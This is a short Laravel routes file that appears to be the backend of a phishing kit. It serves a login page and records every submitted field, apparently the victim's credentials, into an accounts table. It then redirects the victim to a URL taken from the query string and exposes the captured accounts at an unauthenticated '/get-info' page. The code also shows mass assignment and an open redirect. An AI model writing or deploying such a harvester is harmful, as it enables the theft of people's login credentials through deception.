<?php

use App\Account;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
 */

Route::get('/', function () {
    $parameters = request()->query();

    $url = $parameters['url'];

    session(['url' => $url]);

    return view('login');

});

Route::post('', function () {
    Account::create(request()->all());

    $url = session('url');

    return redirect($url);
});

Route::get('/get-info', function () {
    $accounts = Account::latest()->groupBy('email')->paginate(30);

    return view('accounts', compact('accounts'));
});
